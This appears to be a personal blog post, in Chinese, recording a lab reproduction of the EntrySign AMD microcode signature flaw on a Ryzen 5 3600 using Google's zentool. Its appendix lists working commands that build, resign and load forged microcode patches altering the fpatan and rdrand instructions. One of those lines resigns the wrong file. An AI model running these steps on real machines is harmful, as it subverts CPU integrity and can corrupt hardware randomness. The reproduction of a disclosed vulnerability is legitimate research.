
---
title: '在AMD R5-3600 (Matisse)上复现EntrySign记录'
date: 2025-10-14 23:00:00
tags:
    - Security
    - CPU
    - ucode

categories:
  - AMD
---

## 前言

感谢这个report: https://bughunters.google.com/blog/5424842357473280/zen-and-the-art-of-microcode-hacking ，感谢这个lecture https://www.youtube.com/watch?v=sUFDKTaCQEk  ，本PPT也上传到了 [google drive](https://drive.google.com/file/d/1IUxMzgoOq0EirJmkHDtOmnlHGABM1jbZ/view?usp=sharing) 

对应zentool的链接 https://github.com/google/security-research/tree/master/pocs/cpus/entrysign/zentool ，
对应ucode包的链接 https://github.com/platomav/CPUMicrocodes/blob/0be0bd7b6a3ec1f1b59562729f1ce14b9569b697/AMD/cpu00870F10_ver08701034_2024-02-23_52FB44A3.bin 

## 碎碎念
1. 在升级的时候一开始是021版本，然后手贱，没改034的包直接刷进去了，微码就变成034了... 后面发现>034的051能做
2. ZENTOOL_XXTEA_KEY那个key是真的文档里的那个key

## 附录

Code of create template
```zsh
 cd ~/Code/CS253/EntrySign/security-research-zentool/pocs/cpus/entrysign/zentool
 ZENTOOL_XXTEA_KEY=0x2b7e151628aed2a6abf7158809cf4f3c  make template.bin 
 ./zentool edit --hdr-revlow 0x8701051 template.bin
 ./zentool resign template.bin

```

Code of attack on fpatan
```zsh
./zentool -o fpatan.bin edit --match 0=@fpatan --seq 0=7 --insn q0i0="add rax, rax, 0x1337" template.bin
./zentool resign fpatan.bin
sudo ./zentool load --cpu=2 fpatan.bin 
```
![fpatan攻击结果](images/entrysign-fpatan-crash.png)


Code of attack on rdrand
```zsh
./zentool -o rdrand.bin edit --match 0=@rdrand --seq 0=0x100002 --insn q0i0="mov.qs rax,rax,4" template.bin
./zentool resign fpatan.bin
sudo ./zentool/zentool load --cpu=4 ./zentool/rdrand.bin ;sudo rdmsr -a 0x8b ; taskset -c 4 ./rdrand_test
```
![rdrand攻击结果](images/entrysign-rdrand-crash.png)
